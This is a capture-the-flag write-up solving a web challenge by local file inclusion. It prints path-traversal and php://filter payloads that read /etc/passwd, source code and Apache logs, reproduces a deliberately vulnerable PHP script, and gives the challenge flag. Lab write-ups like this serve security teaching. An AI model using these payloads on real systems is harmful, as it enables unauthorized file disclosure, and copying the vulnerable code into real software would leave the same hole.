From the description of the challenge, we can get 2 key elements; the first one is that `GET` method will be used at some point and the second is that this challenge has something to do with `Logs`.


## Recon and Analysis

Going into the website, we can see lots of files to click on and they basically all end up giving the same output..

If you keep going down the list, you will eventually find a pattern in the url `http://3.7.251.179/click-here_1.php`. The name of the `php` script in the directory increments by 1 all the way to 99, by then you should try numbers like `click-here_100.php` and `click-here_0.php`... At last you will find the correct file _hopefully_ that is `click-here_00.php`. 

After that, you will be greeted with a new response:

`You got the right 'file' :)` is considered a hint from the author of the challenge along with the description of using `GET`. The intended path is to use `file` as a parameter in a `GET` request. 

Trying out the url `http://3.7.251.179/click-here_00.php?file=../../../../../../../../etc/passwd` will yeld us LFI (Local File Inclusion) and we can read the content of `/etc/passwd`, where the challenge begins.

## Solution and Flag

Searching around the internet for LFI vulnerabilities and payloads. I came across a couple of interesting stuff from [PayloadAllTheThings](https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal).

Trying to read the content of the `click-here_00.php` itself using `php://filter/convert.base64-encode/resource=click-here_00.php`, we will have the base64 encoded script. We can easily decode it and view the php script:

```html
<html>
    <title>Something here!</title>
    <body>
            <?php
          		if(!isset($_GET['file']))
          		{
          			echo "You got the right 'file' :)";
          		} elseif($file=$_GET['file'])
          		{
          			echo file_get_contents($file);
          			die();
          		}
            #There is some error in logs try to access it.
            ?>
    </body>
</html>
```

Checking the location of the HTTP error logs, I found [this](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) blog:
>Debian / Ubuntu Linux Apache error log file location â€“ /var/log/apache2/error.log

So, I used the same LFI payload but changed the resource to `/var/log/apache2/error.log` and got this output:

```html
<html>
    <title>Something here!</title>
    <body>
            LS0tLS0tLS0tLV08LTwtLS08LS0tLS0tLTwtLS0tLS0tLS0tPj4+PitbPDwtLS0tLS0tLS0tLS0tLS0tLSw8PC0tLD4+LDw8LS0tLS0tLD4+LDw8KysrKysrKysrKyssPj4sPDwtLS0tLS0sPj4sPDwtLS0tLS0tLS0tLS0sKysrKywrKywrKysrKysrKywtLS0tLS0tLS0tLS0tLS0sKysrKysrKysrKysrLC0sLS0tLS0sKysrKysrKyw+LS0tLS0tLS0tLS0tLS0tLDwtLS0tLS0tLCsrKysrKysrKywsKyw+PissPDwtLS0tLS0tLS0tLS0tLS0tLC0tLS0sKysrKyxBSDAwNTU4OiBhcGFjaGUyOiBDb3VsZCBub3QgcmVsaWFibHkgZGV0ZXJtaW5lIHRoZSBzZXJ2ZXIncyBmdWxseSBxdWFsaWZpZWQgZG9tYWluIG5hbWUsIHVzaW5nIDE3Mi4xNy4wLjIuIFNldCB0aGUgJ1NlcnZlck5hbWUnIGRpcmVjdGl2ZSBnbG9iYWxseSB0byBzdXBwcmVzcyB0aGlzIG1lc3NhZ2UKW1NhdCBPY3QgMTAgMTg6MjU6MjUuNTcwNDg0I
            ....
    </body>
```

Decoding that file from base64, I found something similar to `brainfuck`, which is an [esoteric programming language](https://en.wikipedia.org/wiki/Esoteric_programming_language).

```brainfuck
----------]<-<---<-------<---------->>>>+[<<-----------------,<<--,>>,<<------,>>,<<+++++++++++,>>,<<------,>>,<<------------,++++,++,++++++++,---------------,++++++++++++,-,-----,+++++++,>---------------,<-------,+++++++++,,+,>>+,<<----------------,----,++++,
```

While reading about `brainfuck`, I found that it can be interpreted and output something only if it contains a period `"."` and it will request an input when it contains a coma `","`. The string that I had only contained comas, and I found that there were closed square brackets that were not opened and vise-versa.

>Maybe I need to reverse it before interpreting it. Hmmmmmm!!

Afterward, I got stuck on the "no periods" part.. Then it hit me, maybe there is a "Reversed-brainfuck" esoteric programming language, and a simple google search revealed a decoder and I got this output:

```
/f/l/a/g/somethingUneed.txt
```

Using the LFI payload again, but this time the resource is going to be that new directory, we will get the flag...

`BSDCTF{L0cal_f1L3_InClu$10N_1$_v3RY_P015On0u$}`
